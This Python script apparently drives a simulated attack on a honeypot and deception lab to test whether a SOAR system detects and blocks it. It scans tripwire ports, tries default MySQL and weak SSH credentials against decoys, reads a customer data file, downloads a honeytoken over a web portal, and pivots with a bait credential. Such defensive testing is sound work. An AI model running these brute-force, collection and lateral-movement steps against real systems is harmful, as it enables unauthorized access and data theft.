import socket
import time
import random
import paramiko
import pymysql
import urllib.request
import urllib.parse

TRIPWIRE_PORTS = [2323, 4445, 3390, 5901, 6380, 9201]

def log(m):
    print(f"[attacker:targeted] {m}", flush=True)

def human(a=1.5, b=3.5):
    """Simulates realistic human analyst/attacker typing delays."""
    time.sleep(random.uniform(a, b))

def scan():
    log("Stage 1 (Recon): Scanning decoy tripwire ports...")
    for p in TRIPWIRE_PORTS:
        try:
            s = socket.create_connection(("tripwire", p), timeout=2)
            s.close()
        except Exception:
            pass
        time.sleep(0.3)
    log("Scan complete.")

def mysql_probe():
    log("Stage 2 (Recon): Probing MySQL default credentials on fileserv-01 (opencanary)...")
    for u, p in (("root", "root"), ("root", "")):
        try:
            conn = pymysql.connect(host="opencanary", user=u, password=p, connect_timeout=3)
            conn.close()
        except Exception:
            pass
        time.sleep(0.5)

def ssh_decoy():
    log("Stage 3 (Initial Access): Attempting SSH brute-force on db-prod-02...")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Try weak credentials
    creds = [("root", "123456"), ("admin", "admin"), ("root", "root")]
    connected = False
    for u, p in creds:
        try:
            c.connect("cowrie", port=2222, username=u, password=p, timeout=5, allow_agent=False, look_for_keys=False)
            log(f"SSH authentication successful: {u}:{p}")
            connected = True
            break
        except Exception:
            time.sleep(0.8)

    if not connected:
        log("Failed to connect to SSH decoy.")
        return

    log("Stage 4 (Discovery & Collection): Interactive shell commands executed...")
    ch = c.invoke_shell()
    time.sleep(1.5)

    commands = [
        "whoami",
        "uname -a",
        "ls /home/dbadmin",
        "cat /home/dbadmin/notes.txt",
        "ls /srv/backups",
        "cat /srv/backups/customer_data_2026.csv"
    ]

    for cmd in commands:
        human()
        log(f"  $ {cmd}")
        ch.send(cmd + "\n")
        time.sleep(0.8)
        while ch.recv_ready():
            ch.recv(65535)

    human()
    ch.send("exit\n")
    time.sleep(0.5)
    c.close()
    log("Decoy SSH session finished.")

def portal_access():
    log("Stage 5 (Web Exploitation & Honeytoken Exfil): Accessing customer portal...")
    data = urllib.parse.urlencode({"u": "admin", "p": "admin"}).encode("utf-8")
    try:
        req = urllib.request.Request("http://portal:8080/login", data=data)
        urllib.request.urlopen(req, timeout=5).read()
        time.sleep(1.5)
        log("Downloading customer backup dataset with canary honeytoken...")
        urllib.request.urlopen("http://portal:8080/download/customer_data_2026.csv", timeout=5).read()
        log("Downloaded customer_data_2026.csv successfully.")
    except Exception as e:
        log(f"Portal access error: {e}")

def prod_pivot():
    """Attacker pivots using the bait credentials discovered in notes.txt against the REAL host!"""
    log("Stage 6 (Lateral Movement / Real-Asset Touch): Pivoting to prod-web-01 using svc_backup!")
    try:
        s = socket.create_connection(("prod-sim", 80), timeout=3)
        s.close()
        log("Prod HTTP port 80 touched.")
    except Exception as e:
        log(f"Prod HTTP connect error: {e}")

    time.sleep(1.5)
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        log("Attempting SSH login to prod-web-01 with stolen credential svc_backup...")
        c.connect("prod-sim", port=22, username="svc_backup", password="Bkp!2026#vault", timeout=5, allow_agent=False, look_for_keys=False)
    except Exception as e:
        log(f"Prod auth attempt response received (Expected auth rejection): {type(e).__name__}")
    finally:
        try:
            c.close()
        except Exception:
            pass

def wait_for_block():
    log("Monitoring prod-sim connectivity every 3s. Will terminate when blocked by SOAR response...")
    for i in range(40):
        time.sleep(3)
        try:
            s = socket.create_connection(("prod-sim", 22), timeout=2)
            s.sendall(b"SSH-2.0-TestClient\r\n")
            banner = s.recv(1024)
            if not banner:
                raise ConnectionResetError("Connection dropped by prod-sim blocklist")
            s.close()
            log(f"Check {i+1}: prod-sim still reachable...")
        except Exception:
            log(">>> [CONTAINMENT VERIFIED] CONNECTION DROPPED! Attacker blocked by SOAR response. <<<")
            return
    log("Exiting wait loop.")

def run():
    log("=== LAUNCHING TARGETED ATTACK SCENARIO ===")
    scan()
    time.sleep(1.5)
    mysql_probe()
    time.sleep(1.5)
    ssh_decoy()
    time.sleep(1.5)
    portal_access()
    time.sleep(2.0)
    prod_pivot()
    wait_for_block()
    log("=== TARGETED ATTACK SCENARIO COMPLETE ===")

if __name__ == "__main__":
    run()
